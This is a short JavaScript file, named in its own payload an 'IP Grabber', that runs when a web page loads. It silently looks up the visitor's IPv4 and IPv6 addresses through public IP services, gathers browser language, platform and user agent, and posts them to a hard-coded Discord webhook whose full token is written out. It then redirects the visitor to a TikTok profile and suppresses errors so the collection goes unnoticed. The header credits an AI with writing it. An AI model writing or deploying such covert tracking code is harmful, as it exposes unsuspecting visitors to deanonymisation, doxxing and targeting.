// =========================================================
// Code made by Google Genimi & is open source for now!
// =========================================================



// ====================================================
// CONFIGURATION AREA
// ====================================================
const CONFIG = {
    DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1509474688248582214/uCsDG3aQZZ5Npp3o34j3x5YwFvN8AhrcH2tnRenJVmrfE_zr0vLVG-U9cer2-uLgUXfg',
    REDIRECT_URL: 'https://www.tiktok.com/@valeska.rblx?_r=1&_t=ZG-9AnArXZcAO9',
    EMBED_COLOR: 16766720
};
// ====================================================

// Helper function to limit wait times for blocked or hanging connections
function fetchWithTimeout(url, options = {}, timeout = 1500) {
    return Promise.race([
        fetch(url, options),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
    ]);
}

async function trackAndRedirect() {
    let ipv4 = 'Not available / IPv6-Only';
    let ipv6 = 'Not available / IPv4-Only';

    // 1. Fetch strict IPv4 Address
    try {
        const res4 = await fetchWithTimeout('https://ipv4.icanhazip.com');
        if (res4.ok) {
            const text4 = await res4.text();
            if (text4) ipv4 = text4.trim();
        }
    } catch (e) {
        try {
            const res4Fallback = await fetchWithTimeout('https://api.ipify.org');
            if (res4Fallback.ok) {
                const text4Fallback = await res4Fallback.text();
                if (text4Fallback) ipv4 = text4Fallback.trim();
            }
        } catch (err) {}
    }

    // 2. Fetch strict IPv6 Address
    try {
        const res6 = await fetchWithTimeout('https://ipv6.icanhazip.com');
        if (res6.ok) {
            const text6 = await res6.text();
            if (text6) ipv6 = text6.trim();
        }
    } catch (e) {
        try {
            // Using strict IPv6 subdomain to avoid accidental IPv4 returns
            const res6Fallback = await fetchWithTimeout('https://api6.ipify.org');
            if (res6Fallback.ok) {
                const text6Fallback = await res6Fallback.text();
                if (text6Fallback) ipv6 = text6Fallback.trim();
            }
        } catch (err) {}
    }

    // Format current date and time
    const now = new Date();
    const simpleDateString = now.toLocaleString('en-US', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        hour12: false
    });

    // 3. Prepare Discord Embed Payload
    const payload = {
        embeds: [{
            title: "ZeZo Hub | Website IP Grabber",
            color: CONFIG.EMBED_COLOR,
            timestamp: now.toISOString(),
            fields: [
                { name: "IPv4 Address", value: `\`${ipv4}\``, inline: false },
                { name: "IPv6 Address", value: `\`${ipv6}\``, inline: false },
                { name: "Language / Region", value: `\`${navigator.language}\``, inline: true },
                { name: "Platform", value: `\`${navigator.platform}\``, inline: true },
                { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: false }
            ],
            footer: { text: `Visited on: ${simpleDateString}` }
        }]
    };

    // 4. Send Data to Webhook and explicitly wait for completion
    try {
        await fetch(CONFIG.DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        // Ignore network or blocking errors to ensure the flow continues
    } finally {
        // 5. Safe redirection after completion or failure
        window.location.href = CONFIG.REDIRECT_URL;
    }
}
        
window.addEventListener('DOMContentLoaded', trackAndRedirect);
